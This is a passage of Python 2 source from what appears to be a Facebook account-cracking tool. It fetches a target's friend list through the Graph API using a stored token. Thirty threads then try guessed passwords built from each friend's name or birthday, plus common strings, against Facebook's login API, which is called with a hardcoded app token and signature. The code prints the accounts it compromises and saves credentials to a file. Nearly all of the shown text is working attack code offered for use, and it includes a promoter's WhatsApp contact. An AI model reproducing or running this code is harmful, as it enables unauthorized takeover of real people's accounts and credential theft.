				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
	print "  \033[1;91mΒ«---β’ββ’---Developed By Dedsec--β’ββ’---Β»" #Dev:γπ΄π·ππ°ππ·π°πΌγ
	print '\033[1;93mβProcess Has Been Completed Pressβ‘ Ctrl+Z.β© Next Type (0 & Data Reset)β©\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 ____________ΒΆΒΆΒΆ1ΒΆΒΆ_________ΒΆΒΆΒΆΒΆΒΆΒΆΒΆ___________ 
_________ΒΆΒΆΒΆ111ΒΆΒΆ___________ΒΆΒΆ111ΒΆΒΆΒΆΒΆ________ 
______ΒΆΒΆΒΆΒΆ1111ΒΆΒΆΒΆ____________ΒΆΒΆΒΆ1111ΒΆΒΆΒΆ1_____ 
_____ΒΆΒΆΒΆ1111ΒΆΒΆΒΆΒΆ_____________ΒΆΒΆΒΆΒΆ11111ΒΆΒΆΒΆ____ 
___ΒΆΒΆΒΆ11ΒΆ1ΒΆ1ΒΆΒΆΒΆΒΆ___ΒΆΒΆ____ΒΆΒΆ__ΒΆΒΆΒΆΒΆΒΆ1ΒΆ1ΒΆ1ΒΆΒΆΒΆ1__ 
__ΒΆΒΆΒΆ11ΒΆ1ΒΆ11ΒΆΒΆΒΆΒΆΒΆ__ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ__ΒΆΒΆΒΆΒΆΒΆ1ΒΆ1ΒΆΒΆ11ΒΆΒΆ1_ 
_ΒΆΒΆΒΆ11ΒΆΒΆ1ΒΆ11ΒΆΒΆΒΆΒΆΒΆΒΆ__ΒΆΒΆΒΆΒΆΒΆΒΆ_ΒΆΒΆΒΆΒΆΒΆΒΆΒΆ1ΒΆΒΆ1ΒΆΒΆ1ΒΆΒΆΒΆ_ 
ΒΆΒΆΒΆΒΆ1ΒΆΒΆ11ΒΆΒΆ1ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ1ΒΆΒΆ1ΒΆΒΆΒΆ1ΒΆΒΆΒΆ 
ΒΆΒΆΒΆ11ΒΆΒΆ11ΒΆΒΆ1ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆ1ΒΆΒΆΒΆ1ΒΆΒΆΒΆ 
ΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ11ΒΆΒΆΒΆ1ΒΆΒΆΒΆ11ΒΆΒΆ 
_ΒΆΒΆ11ΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆ 
_ΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆΒΆ1ΒΆΒΆ1 
__ΒΆΒΆ1ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ__ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ__ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ1ΒΆΒΆΒΆ_ 
___ΒΆΒΆ1ΒΆΒΆΒΆ_ΒΆΒΆ_______ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ______ΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆΒΆ__ 
____ΒΆΒΆΒΆΒΆ____________ΒΆΒΆΒΆΒΆΒΆΒΆ___________ΒΆΒΆΒΆΒΆ____ 
______ΒΆΒΆΒΆ__________ΒΆΒΆΒΆ__ΒΆΒΆΒΆ__________ΒΆΒΆ______ 
_______ΒΆΒΆΒΆ_________ΒΆ______ΒΆ_________ΒΆΒΆΒΆ______
 
         Checkpoint ID Open After 7 Days

β’\033[1;95mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.
: \033[1;93m ....γπ΄π·ππ°ππ·π°πΌγ....... \033[1;95m :
β’\033[1;95mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.' 
                WhatsApp π
              \033[1;91m +923434810071"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()
        
def hack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;91m2.\x1b[1;96mBlack Jerry WhatsApp Group Indonasia."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;91m3.\x1b[1;96mBlack Jerry Youtube Chenal."
	print "\033[1;97m-β’ββ’-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_hack()

def pilih_hack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[β’ββ’] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			hack()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        elif peak =="2":
	        os.system('xdg-open https://chat.whatsapp.com/D72BfJByaCDJcbJvOOfE')
	        menu()
        elif peak =="3":
	        os.system('xdg-open https://www.youtube.com/channel/UCuUzgS7lnF7S6xnWNl9aIgg')
	        menu()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
	print "\n\033[1;91mΒ«--β’ββ’β’ββ’---\x1b[1;95mβ’ββ’Stop Process Press CTRL+Zβ’ββ’\033[1;91m---β’ββ’β’ββ’-Β»"
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
	print "\033[1;96mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;96mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:γπ΄π·ππ°ππ·π°πΌγ
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'								
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '12345'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = 'kontol123'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'						
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'sayang123'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'123456'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:
                                                                                                           lahir = a['birthday']						
										                           pass8 = lahir.replace('/', '')											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '1122'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ β ] \x1b[1;95mCheckpoint'
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
	print "  \033[1;91mΒ«---β’ββ’---Developed By γπ΄π·ππ°ππ·π°πΌγ--β’ββ’---Β»" #Dev:γπ΄π·ππ°ππ·π°πΌγ
	print '\033[1;93mβProcess Has Been Completed Pressβ‘ Ctrl+Z.β© Next Type (0 & Data Reset)β©\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 ββββββββββββββββββββββββββββ
ββββ¬βββββββββββββββββββββ¬βββ
βββ¬βββ¬βββββββββββββββββ¬βββ¬ββ
βββββ¬βββ¬βββββββββββββ¬βββ¬ββββ
βββββββ¬βββ¬βββββββββ¬βββ¬ββββββ
βββββββββ¬βββ¬βββββ¬βββ¬ββββββββ
βββββββββββ¬βββ¬β¬βββ¬ββββββββββ
βββββββββββββ¬βββ¬ββββββββββββ
ββββββββββββββββββββββββββββ
         Checkpoint ID Open After 7 Days

β’\033[1;95mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.
: \033[1;93m ....γπ΄π·ππ°ππ·π°πΌγ....... \033[1;95m :
β’\033[1;95mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.' 
                WhatsApp π
              \033[1;91m +923434810071"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

def black():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;91m1.\x1b[1;97mClone Friend List Public ID."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;91m2.\x1b[1;97mBlack Jerry WhatsApp Group USA."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;91m3.\x1b[1;97mBlack Jerry Youtube Chenal."
	print "\033[1;97m-β’ββ’-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_black()

def pilih_black():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_black()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[β’ββ’] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
